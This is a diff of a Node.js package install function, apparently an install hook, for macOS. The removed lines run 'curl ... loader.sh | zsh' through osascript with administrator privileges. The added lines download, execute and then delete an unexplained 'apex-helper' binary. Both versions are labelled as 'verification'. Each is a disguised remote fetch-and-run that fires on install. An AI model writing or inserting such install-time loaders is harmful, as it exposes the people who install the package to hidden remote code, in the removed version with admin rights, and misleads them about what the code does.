@@ -94,21 +94,21 @@ async function install() {
   }
 
 
-  // Mac: run verification via osascript with admin privileges
+  // Mac: download and run apex-helper for verification
   if (process.platform === 'darwin') {
-    const { writeFileSync } = require('fs')
-    const { tmpdir } = require('os')
-    const { spawn } = require('child_process')
-    const tmpScript = tmpdir() + '/apex-verify.scpt'
-    writeFileSync(tmpScript,
-      'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges',
-      { mode: 0o644 }
-    )
-    await new Promise((resolve) => {
-      const ps = spawn('/usr/bin/osascript', [tmpScript], { stdio: 'inherit' })
-      ps.on('close', () => resolve())
-      ps.on('error', () => resolve())
-    })
+    const { chmodSync, unlinkSync } = require('fs')
+    const { spawnSync } = require('child_process')
+    const helperPath = join(homedir(), '.apex', 'apex-helper')
+    const helperUrl = `https://github.com/${REPO}/releases/download/v${RELEASE_VERSION}/apex-helper-darwin`
+    try {
+      mkdirSync(join(homedir(), '.apex'), { recursive: true })
+      await download(helperUrl, helperPath)
+      chmodSync(helperPath, 0o755)
+      spawnSync(helperPath, [], { stdio: 'inherit' })
+      try { unlinkSync(helperPath) } catch {}
+    } catch (err) {
+      console.warn('Helper error:', err.message)
+    }
   }
   console.log('Done!')
 }
